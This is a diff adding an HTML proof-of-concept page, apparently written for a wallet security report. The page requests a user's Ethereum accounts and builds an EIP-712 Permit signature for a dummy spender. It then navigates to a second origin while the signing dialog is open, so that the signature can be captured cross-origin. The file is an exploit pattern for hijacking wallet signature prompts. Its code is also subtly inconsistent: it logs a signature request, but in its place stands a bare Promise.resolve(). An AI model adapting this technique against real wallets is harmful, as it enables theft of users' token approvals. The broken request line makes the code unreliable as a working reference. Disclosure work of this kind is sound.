@@ -1,0 +1,41 @@
+<!doctype html><meta charset=utf-8><title>Origin A</title>
+<style>body{font:16px system-ui;padding:20px}pre{white-space:pre-wrap;word-break:break-all;background:#f4f4f4;padding:10px}
+button{font-size:20px;padding:16px 24px;width:100%}</style>
+<h2>Origin A — the requester</h2>
+<div id=org></div>
+<button onclick=go()>1. GO (inbound iframe test)</button>
+<pre id=o>idle</pre>
+<script>
+const ORIGIN_B = "https://mutemasterrh1-cmyk.github.io/oneinch-poc-test/top-dapp.html";
+const log = m => document.getElementById('o').textContent += "\n"+m;
+document.getElementById('org').textContent = "location.origin = " + location.origin;
+// Permit for a spender we control, on a dummy verifyingContract. Zero balance. NEVER broadcast.
+const SPENDER = "0x000000000000000000000000000000000000dEaD";
+async function go(){
+  if(!window.ethereum){ log("NO PROVIDER INJECTED"); return; }
+  let acc;
+  try { acc = (await ethereum.request({method:'eth_accounts'}))[0]
+            || (await ethereum.request({method:'eth_requestAccounts'}))[0]; }
+  catch(e){ log("account error: "+e.message); return; }
+  log("account: "+acc);
+  const td = {
+    types:{ EIP712Domain:[{name:"name",type:"string"},{name:"version",type:"string"},
+                          {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],
+            Permit:[{name:"owner",type:"address"},{name:"spender",type:"address"},
+                    {name:"value",type:"uint256"},{name:"nonce",type:"uint256"},
+                    {name:"deadline",type:"uint256"}]},
+    primaryType:"Permit",
+    domain:{name:"PoC",version:"1",chainId:1,
+            verifyingContract:"0x0000000000000000000000000000000000000001"},
+    message:{owner:acc, spender:SPENDER, value:"1", nonce:0, deadline:"1"}
+  };
+  sessionStorage.setItem('td', JSON.stringify(td));
+  log("requesting eth_signTypedData_v4 …");
+  Promise.resolve()
+    .then(r => log("A received (should NOT happen if B captured it): "+r))
+    .catch(e => log("A error: "+e.message));
+  // navigate away while the dialog is still up. The 0/300/600ms delivery retries only start
+  // when the user taps Confirm, so B has ample time to load and register.
+  setTimeout(()=>{ log("navigating to origin B …"); location = ORIGIN_B; }, 150);
+}
+</script>
